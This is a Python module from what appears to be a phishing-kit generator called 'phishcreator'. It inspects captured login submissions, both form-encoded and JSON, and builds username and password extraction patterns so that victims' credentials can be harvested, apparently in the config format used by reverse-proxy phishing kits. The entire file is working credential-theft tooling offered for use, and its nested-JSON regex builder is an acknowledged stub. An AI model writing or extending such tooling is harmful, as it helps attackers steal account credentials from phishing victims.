#!/usr/bin/env python3
"""
Intelligent Credential Extractor
Dynamically detects and extracts credentials from various authentication formats
"""

import re
import json
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from urllib.parse import parse_qs, unquote

# Import shared constants
try:
    from phishcreator.modules.constants import USERNAME_PATTERNS, PASSWORD_PATTERNS
except ImportError:
    try:
        from constants import USERNAME_PATTERNS, PASSWORD_PATTERNS
    except ImportError:
        USERNAME_PATTERNS = None
        PASSWORD_PATTERNS = None


@dataclass
class CredentialPattern:
    """Represents a detected credential extraction pattern"""
    username_key: str
    username_search: str
    username_type: str
    password_key: str
    password_search: str
    password_type: str
    confidence: float
    extraction_method: str  # 'form', 'json', 'regex', 'ai'
    notes: str = ""


class IntelligentCredentialExtractor:
    """
    Intelligently extracts credentials from different authentication formats:
    - Simple form fields (key-value pairs)
    - JSON payloads (nested structures)
    - Complex API formats (Google, Microsoft, etc.)
    - Base64-encoded data
    """

    # Fallback patterns if constants module not available
    _DEFAULT_USERNAME_PATTERNS = [
        'username', 'user', 'email', 'login', 'account', 'userid', 'user_id',
        'identifier', 'loginfmt', 'j_username', 'login_email', 'signin_email',
        'userPrincipalName', 'login_hint', 'emailAddress', 'userName', 'loginId',
        'userLogin', 'session[username_or_email]', 'identity', 'principal',
        'user_name', 'user-name', 'user.name', 'loginname', 'login_name'
    ]

    _DEFAULT_PASSWORD_PATTERNS = [
        'password', 'passwd', 'pass', 'pwd', 'secret', 'credential',
        'j_password', 'session[password]', 'signin_password', 'login_password',
        'userPassword', 'secretKey', 'accessKey', 'pin', 'passcode',
        'pass_word', 'pass-word', 'pass.word', 'user_password'
    ]

    def __init__(self):
        self.detected_patterns = []
        # Use shared constants or fallback to defaults
        self.username_patterns = USERNAME_PATTERNS if USERNAME_PATTERNS else self._DEFAULT_USERNAME_PATTERNS
        self.password_patterns = PASSWORD_PATTERNS if PASSWORD_PATTERNS else self._DEFAULT_PASSWORD_PATTERNS
    
    def extract_credentials(self, form_submissions: List[Dict], 
                          observed_username: Optional[str] = None,
                          observed_password: Optional[str] = None) -> CredentialPattern:
        """
        Extract credential patterns from form submissions
        
        Args:
            form_submissions: List of form submission data
            observed_username: Known username value (for pattern matching)
            observed_password: Known password value (for pattern matching)
        
        Returns:
            CredentialPattern object with extraction details
        """
        if not form_submissions:
            return self._create_default_pattern()
        
        # Try different extraction methods in order of complexity
        for form in form_submissions:
            # Method 1: Simple form field detection
            if self._is_form_based(form):
                pattern = self._extract_from_form_fields(form, observed_username, observed_password)
                if pattern and pattern.confidence > 0.7:
                    return pattern
            
            # Method 2: JSON payload extraction
            if self._is_json_based(form):
                pattern = self._extract_from_json(form, observed_username, observed_password)
                if pattern and pattern.confidence > 0.7:
                    return pattern
        
        # Method 3: Fallback to regex-based extraction
        return self._extract_with_regex(form_submissions, observed_username, observed_password)
    
    def _is_form_based(self, form: Dict) -> bool:
        """Check if submission is traditional form-based"""
        content_type = form.get('content_type', '')
        return 'application/x-www-form-urlencoded' in content_type or \
               'multipart/form-data' in content_type
    
    def _is_json_based(self, form: Dict) -> bool:
        """Check if submission is JSON-based"""
        content_type = form.get('content_type', '')
        return 'application/json' in content_type
    
    def _extract_from_form_fields(self, form: Dict, 
                                  observed_username: Optional[str],
                                  observed_password: Optional[str]) -> Optional[CredentialPattern]:
        """Extract credentials from simple form fields"""
        fields = form.get('fields', {})
        detected_username_field = form.get('detected_username_field')
        detected_password_field = form.get('detected_password_field')
        
        # Use detected fields if available
        if detected_username_field and detected_password_field:
            return CredentialPattern(
                username_key=detected_username_field,
                username_search='(.*)',
                username_type='post',
                password_key=detected_password_field,
                password_search='(.*)',
                password_type='post',
                confidence=0.95,
                extraction_method='form',
                notes=f"Detected form fields: {detected_username_field}, {detected_password_field}"
            )
        
        # Try to detect by pattern matching
        username_key = None
        password_key = None
        
        for field_name in fields.keys():
            field_lower = field_name.lower()

            # Check username patterns
            if not username_key:
                for pattern in self.username_patterns:
                    if pattern in field_lower:
                        username_key = field_name
                        break

            # Check password patterns
            if not password_key:
                for pattern in self.password_patterns:
                    if pattern in field_lower:
                        password_key = field_name
                        break
        
        if username_key and password_key:
            return CredentialPattern(
                username_key=username_key,
                username_search='(.*)',
                username_type='post',
                password_key=password_key,
                password_search='(.*)',
                password_type='post',
                confidence=0.85,
                extraction_method='form',
                notes=f"Pattern-matched form fields: {username_key}, {password_key}"
            )
        
        return None
    
    def _extract_from_json(self, form: Dict,
                          observed_username: Optional[str],
                          observed_password: Optional[str]) -> Optional[CredentialPattern]:
        """Extract credentials from JSON payloads"""
        fields = form.get('fields', {})
        
        # Try to parse as JSON
        try:
            # Fields might already be a dict or need parsing
            if isinstance(fields, str):
                json_data = json.loads(fields)
            else:
                json_data = fields
            
            # If we have observed values, find them in the JSON structure
            if observed_username and observed_password:
                username_path = self._find_value_in_json(json_data, observed_username)
                password_path = self._find_value_in_json(json_data, observed_password)
                
                if username_path and password_path:
                    username_regex = self._generate_json_regex(json_data, username_path, observed_username)
                    password_regex = self._generate_json_regex(json_data, password_path, observed_password)
                    
                    return CredentialPattern(
                        username_key='',
                        username_search=username_regex,
                        username_type='post',
                        password_key='',
                        password_search=password_regex,
                        password_type='post',
                        confidence=0.90,
                        extraction_method='json',
                        notes=f"JSON paths: {username_path}, {password_path}"
                    )
            
            # Fallback: look for common JSON field names
            username_key, password_key = self._find_credentials_in_json(json_data)
            if username_key and password_key:
                return CredentialPattern(
                    username_key=username_key,
                    username_search='(.*)',
                    username_type='json',
                    password_key=password_key,
                    password_search='(.*)',
                    password_type='json',
                    confidence=0.75,
                    extraction_method='json',
                    notes=f"JSON field detection: {username_key}, {password_key}"
                )
        
        except json.JSONDecodeError:
            pass
        
        return None
    
    def _extract_with_regex(self, form_submissions: List[Dict],
                           observed_username: Optional[str],
                           observed_password: Optional[str]) -> CredentialPattern:
        """Fallback regex-based extraction"""
        
        # If we have observed values, try to build regex patterns
        if observed_username and observed_password:
            # Look through all submissions to find the values
            for form in form_submissions:
                post_data = str(form.get('fields', ''))
                
                # Try to locate username and password in the data
                if observed_username in post_data and observed_password in post_data:
                    # Build context-aware regex
                    username_regex = self._build_contextual_regex(post_data, observed_username)
                    password_regex = self._build_contextual_regex(post_data, observed_password)
                    
                    return CredentialPattern(
                        username_key='',
                        username_search=username_regex,
                        username_type='post',
                        password_key='',
                        password_search=password_regex,
                        password_type='post',
                        confidence=0.70,
                        extraction_method='regex',
                        notes="Context-aware regex extraction"
                    )
        
        # Ultimate fallback: generic pattern
        return self._create_default_pattern()
    
    def _find_value_in_json(self, obj: Any, target_value: str, path: str = "") -> Optional[str]:
        """Recursively find path to value in nested JSON"""
        if isinstance(obj, dict):
            for key, value in obj.items():
                new_path = f"{path}.{key}" if path else key
                result = self._find_value_in_json(value, target_value, new_path)
                if result:
                    return result
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                new_path = f"{path}[{i}]"
                result = self._find_value_in_json(item, target_value, new_path)
                if result:
                    return result
        elif str(obj) == target_value:
            return path
        return None
    
    def _generate_json_regex(self, json_data: Any, path: str, value: str) -> str:
        """Generate regex pattern to extract value from JSON"""
        # Escape special regex characters in the value
        escaped_value = re.escape(value)
        
        # Build regex based on JSON structure
        # This is a simplified version - real implementation would be more sophisticated
        path_parts = path.split('.')
        
        if len(path_parts) == 1:
            # Simple top-level field
            return f'"{path_parts[0]}"\\s*:\\s*"(.*?)"'
        else:
            # Nested field - build pattern
            return f'"(.*?)"'  # Generic pattern for now
    
    def _find_credentials_in_json(self, json_data: Any, path: str = "") -> Tuple[Optional[str], Optional[str]]:
        """Find credential fields in JSON by pattern matching"""
        username_key = None
        password_key = None
        
        if isinstance(json_data, dict):
            for key, value in json_data.items():
                key_lower = key.lower()
                
                # Check username patterns
                if not username_key:
                    for pattern in self.username_patterns:
                        if pattern in key_lower:
                            username_key = f"{path}.{key}" if path else key
                            break

                # Check password patterns
                if not password_key:
                    for pattern in self.password_patterns:
                        if pattern in key_lower:
                            password_key = f"{path}.{key}" if path else key
                            break
                
                # Recurse into nested objects
                if isinstance(value, dict):
                    new_path = f"{path}.{key}" if path else key
                    nested_user, nested_pass = self._find_credentials_in_json(value, new_path)
                    if nested_user and not username_key:
                        username_key = nested_user
                    if nested_pass and not password_key:
                        password_key = nested_pass
        
        return username_key, password_key
    
    def _build_contextual_regex(self, text: str, value: str) -> str:
        """Build regex pattern based on surrounding context"""
        # Find the value in text
        index = text.find(value)
        if index == -1:
            return '(.*)'
        
        # Get context before and after
        before = text[max(0, index-50):index]
        after = text[index+len(value):min(len(text), index+len(value)+50)]
        
        # Look for delimiters
        before_delimiter = self._find_delimiter(before, reverse=True)
        after_delimiter = self._find_delimiter(after, reverse=False)
        
        # Build regex
        if before_delimiter and after_delimiter:
            pattern = f'{re.escape(before_delimiter)}(.*?){re.escape(after_delimiter)}'
            return pattern
        
        return '(.*)'
    
    def _find_delimiter(self, text: str, reverse: bool = False) -> str:
        """Find delimiter character in text"""
        delimiters = ['"', "'", ':', '=', ',', '[', ']', '{', '}']
        
        if reverse:
            text = text[::-1]
        
        for char in text:
            if char in delimiters:
                return char
        
        return ''
    
    def _create_default_pattern(self) -> CredentialPattern:
        """Create default credential pattern as fallback"""
        return CredentialPattern(
            username_key='username',
            username_search='(.*)',
            username_type='post',
            password_key='password',
            password_search='(.*)',
            password_type='post',
            confidence=0.50,
            extraction_method='default',
            notes="Default pattern - manual verification recommended"
        )


def extract_credentials(form_submissions: List[Dict],
                       observed_username: Optional[str] = None,
                       observed_password: Optional[str] = None) -> CredentialPattern:
    """
    Convenience function to extract credentials
    
    Args:
        form_submissions: List of form submission data
        observed_username: Known username value
        observed_password: Known password value
    
    Returns:
        CredentialPattern object
    """
    extractor = IntelligentCredentialExtractor()
    return extractor.extract_credentials(form_submissions, observed_username, observed_password)
